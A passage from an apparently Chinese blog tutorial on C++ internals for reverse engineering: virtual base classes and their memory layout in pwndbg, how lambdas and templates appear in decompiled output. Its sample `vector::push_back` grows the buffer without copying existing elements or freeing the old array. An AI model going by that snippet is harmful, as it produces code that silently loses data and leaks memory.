class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> B, <span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">B</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于B虚继承A，因此派生类D需要完成虚基类A的构造</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A()</span><br><span class="line">B()</span><br><span class="line">C()</span><br><span class="line">D()</span><br></pre></td></tr></table></figure>
<p>案例：虚基类的构造问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">A</span>(<span class="keyword">int</span> data):<span class="built_in">ma</span>(data)&#123; cout &lt;&lt; <span class="string">&quot;A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">A</span>()&#123; cout &lt;&lt; <span class="string">&quot;~A()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> ma;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">B</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">mb</span>(data+<span class="number">1</span>) &#123; cout &lt;&lt; <span class="string">&quot;B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">public</span> B&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">C</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">B</span>(data),<span class="built_in">mc</span>(data+<span class="number">2</span>) &#123; cout &lt;&lt; <span class="string">&quot;C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">C</span>()&#123; cout &lt;&lt; <span class="string">&quot;~C()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> mc;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> :</span><span class="keyword">public</span> C&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">D</span>(<span class="keyword">int</span> data):<span class="built_in">A</span>(data),<span class="built_in">C</span>(data),<span class="built_in">md</span>(data+<span class="number">3</span>) &#123; cout &lt;&lt; <span class="string">&quot;D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">D</span>()&#123; cout &lt;&lt; <span class="string">&quot;~D()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> md;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    D* a = <span class="keyword">new</span> <span class="built_in">D</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于B虚继承A，因此派生类CD都有可能完成虚基类A的构造</li>
<li>通常由最后一级的派生类通常负责构造虚基类</li>
</ul>
<p>虚基类的内存布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x55555556aea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555556aea8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbx <span class="number">0x55555556aeb0</span> —▸ <span class="number">0x555555557cb8</span> ◂— <span class="number">0x555555557cb8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555556aeb8</span> ◂— <span class="number">0xc0000000b</span> <span class="comment">/* &#x27;\x0b&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555556aec0</span> ◂— <span class="number">0xa0000000d</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>虚继承的子类都有一个虚基类指针，其指向虚基类表（虚基类指针和虚函数的虚指针不是同一个东西）</li>
<li>虚继承底层实现原理与编译器相关，一般通过虚基类指针和虚基类表实现 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555556aea0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x55555556aea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555556aea8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbx <span class="number">0x55555556aeb0</span> —▸ <span class="number">0x555555557c28</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555556aeb8</span> ◂— <span class="number">0xc0000000b</span> <span class="comment">/* &#x27;\x0b&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555556aec0</span> ◂— <span class="number">0xd</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x55555556aec8</span> —▸ <span class="number">0x555555557c40</span> —▸ <span class="number">0x55555555536c</span> (A::fun()) ◂— endbr64 </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x55555556aed0</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>0x555555557c40</code> 就是A类的虚指针，而 <code>0x555555557c28</code> 是D类的虚基类指针</li>
</ul>
<h2 id="匿名函数-Lambda"><a href="#匿名函数-Lambda" class="headerlink" title="匿名函数 Lambda"></a>匿名函数 Lambda</h2><p>lambda 函数是一种匿名函数，它表示一个接受参数并返回一个值的函数</p>
<p>lambda 函数的语法如下： </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture](parameters) -&gt; return_type &#123; function_body &#125;</span><br></pre></td></tr></table></figure>
<p>测试样例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lambda_ta)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lambda_tb)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*lambda_tc)</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">lambda_ta lambdaA = [](<span class="keyword">int</span> a) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">lambda_tb lambdaB = [](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x0 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x1 = <span class="built_in">lambdaA</span>(x0);</span><br><span class="line">    <span class="keyword">int</span> x2 = <span class="built_in">lambdaB</span>(x0,x1);</span><br><span class="line">    <span class="keyword">double</span> y0 = x1 + x2;</span><br><span class="line">    <span class="keyword">double</span> y1 = [](<span class="keyword">double</span> a) -&gt; <span class="keyword">double</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a * <span class="number">2</span>;</span><br><span class="line">    &#125;(y0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在底层，局部匿名函数和全局匿名函数的实现不同</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x0 = <span class="number">5</span>;</span><br><span class="line">x1 = <span class="built_in">lambdaA</span>(<span class="number">5</span>);</span><br><span class="line">y0 = (<span class="keyword">double</span>)(x1 + <span class="built_in">lambdaB</span>(<span class="number">5</span>, x1));</span><br><span class="line">main::&#123;<span class="built_in">lambda</span>(<span class="keyword">double</span>)#<span class="number">1</span>&#125;::<span class="built_in"><span class="keyword">operator</span></span>()(&amp;__closure, y0);</span><br></pre></td></tr></table></figure>
<ul>
<li>匿名函数和普通函数本质上的区别就是：匿名函数不能通过函数名来调用</li>
<li>调用全局匿名函数其实是调用全局变量上对应的函数指针：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000004010</span>                               <span class="keyword">public</span> lambdaA</span><br><span class="line">.data:<span class="number">0000000000004010</span>                               ; lambda_ta lambdaA</span><br><span class="line">.data:<span class="number">0000000000004010</span> <span class="number">1</span>A <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lambdaA dq offset _ZN7lambdaAMUliE_4_FUNEi</span><br><span class="line">.data:<span class="number">0000000000004010</span>                                                                       ; DATA XREF: main+<span class="number">22</span>↑r</span><br><span class="line">.data:<span class="number">0000000000004018</span>                               <span class="keyword">public</span> lambdaB</span><br><span class="line">.data:<span class="number">0000000000004018</span>                               ; lambda_tb lambdaB</span><br><span class="line">.data:<span class="number">0000000000004018</span> <span class="number">55</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lambdaB dq offset _ZN7lambdaBMUliiE_4_FUNEii</span><br><span class="line">.data:<span class="number">0000000000004018</span>                                                                       ; DATA XREF: main+<span class="number">33</span>↑r</span><br></pre></td></tr></table></figure>
<ul>
<li>而局部匿名函数本质上是对 <code>()</code> 的重载</li>
<li>调用局部匿名函数其实是调用对应的重载函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> __cdecl main::&#123;<span class="built_in">lambda</span>(<span class="keyword">double</span>)#<span class="number">1</span>&#125;::<span class="built_in"><span class="keyword">operator</span></span>()(</span><br><span class="line">        <span class="keyword">const</span> main::$<span class="number">256B</span>327EE357AF9FCD813216707B60D5 *<span class="keyword">const</span> __closure,</span><br><span class="line">        <span class="keyword">double</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a + a; <span class="comment">/* PS:编译器对这里进行了优化 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型编程"><a href="#泛型编程" class="headerlink" title="泛型编程"></a>泛型编程</h2><p>模板是泛型编程的基础，泛型编程即以一种独立于任何特定类型的方式编写代码 </p>
<p>模板有两类：函数模板，类模板</p>
<p><strong>函数模板</strong></p>
<p>不规定某个函数的传参类型或者返回值类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T &amp;num1, T&amp; num2)</span></span>&#123;</span><br><span class="line">	T tmp = num1;</span><br><span class="line">	num1 = num2;</span><br><span class="line">	num2 = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line">	<span class="built_in">Swap</span>(a,b); <span class="comment">/* 函数模板实例化 */</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a :&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;b :&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">float</span> c = <span class="number">10.55f</span>,  d = <span class="number">3.14f</span>;</span><br><span class="line">	<span class="built_in">Swap</span>(c, d); <span class="comment">/* 函数模板实例化 */</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c :&quot;</span> &lt;&lt; c &lt;&lt; <span class="string">&quot;d :&quot;</span> &lt;&lt; d &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数模板不规定参数类型，返回值类型</li>
<li>在编译时，编译器会根据实际传参来创建不同类型的副本，这个过程被称为函数模板实例化</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span>;</span><br><span class="line">b = <span class="number">20</span>;</span><br><span class="line">Swap&lt;<span class="keyword">int</span>&gt;(&amp;a, &amp;b); <span class="comment">/* 函数模板实例化(创建int类型的副本) */</span></span><br><span class="line">v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_2005);</span><br><span class="line">v4 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a);</span><br><span class="line">v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v4, &amp;unk_2009);</span><br><span class="line">v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)b);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">c = <span class="number">10.55</span>;</span><br><span class="line">d = <span class="number">3.1400001</span>;</span><br><span class="line">Swap&lt;<span class="keyword">float</span>&gt;(&amp;c, &amp;d); <span class="comment">/* 函数模板实例化(创建float类型的副本) */</span></span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_200D);</span><br><span class="line">v8 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, *(<span class="keyword">double</span> *)_mm_cvtsi32_si128(<span class="built_in">LODWORD</span>(c)).m128i_i64);</span><br><span class="line">v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v8, &amp;unk_2011);</span><br><span class="line">v10 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, *(<span class="keyword">double</span> *)_mm_cvtsi32_si128(<span class="built_in">LODWORD</span>(d)).m128i_i64);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br></pre></td></tr></table></figure>
<p><img src="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/1686123247822.png" alt="1686123247822">    </p>
<p>下面是一个特殊的案例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">lambda_t</span>)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">lambda_t</span> sub = [](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Fn&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(Fn <span class="keyword">const</span> &amp;fn)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fn</span>(a,b) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(add);</span><br><span class="line">    <span class="built_in">func</span>([](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a * b;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">func</span>(sub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数模板和类模板都可以将 “函数指针” 当做类型</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func&lt;<span class="built_in"><span class="keyword">int</span></span> ()(<span class="keyword">int</span>,<span class="keyword">int</span>)&gt;((<span class="built_in"><span class="keyword">int</span></span> (*)(<span class="keyword">int</span>, <span class="keyword">int</span>))add); <span class="comment">/* 普通函数 */</span></span><br><span class="line">func&lt;main::&#123;<span class="built_in">lambda</span>(<span class="keyword">int</span>,<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(&amp;fn); <span class="comment">/* 局部匿名函数 */</span></span><br><span class="line">func&lt;<span class="built_in"><span class="keyword">int</span></span> (*)(<span class="keyword">int</span>,<span class="keyword">int</span>)&gt;(&amp;sub); <span class="comment">/* 全局匿名函数 */</span></span><br></pre></td></tr></table></figure>
<p><strong>类模板</strong></p>
<p>不规定该类中某个函数的传参类型或返回值类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mzt &#123;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vector</span> &#123;</span></span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">vector</span>() : _a(<span class="literal">nullptr</span>),_size(<span class="number">0</span>),_capacity(<span class="number">0</span>)&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> T&amp; data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (_capacity == _size) &#123;</span><br><span class="line">                <span class="keyword">size_t</span> newcapacity = _capacity == <span class="number">0</span> ? <span class="number">4</span> : _capacity * <span class="number">2</span>;</span><br><span class="line">                T* tmp = <span class="keyword">new</span> T[newcapacity];</span><br><span class="line">                <span class="built_in">assert</span>(tmp);</span><br><span class="line">                _a = tmp;</span><br><span class="line">                _capacity = newcapacity;</span><br><span class="line">            &#125;</span><br><span class="line">            _a[_size++] = data;</span><br><span class="line">        &#125;</span><br><span class="line">        T&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> pos) &#123;</span><br><span class="line">            <span class="built_in">assert</span>(pos &lt; _size);</span><br><span class="line">            <span class="keyword">return</span> _a[pos];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">size_t</span> <span class="title">getsize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span>:</span><br><span class="line">        T*  _a;</span><br><span class="line">        <span class="keyword">size_t</span> _size;</span><br><span class="line">        <span class="keyword">size_t</span> _capacity;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mzt::vector&lt;<span class="keyword">int</span>&gt; a; <span class="comment">/* 类模板实例化 */</span></span><br><span class="line">    a.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    a.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    mzt::vector&lt;<span class="keyword">double</span>&gt; b; <span class="comment">/* 类模板实例化 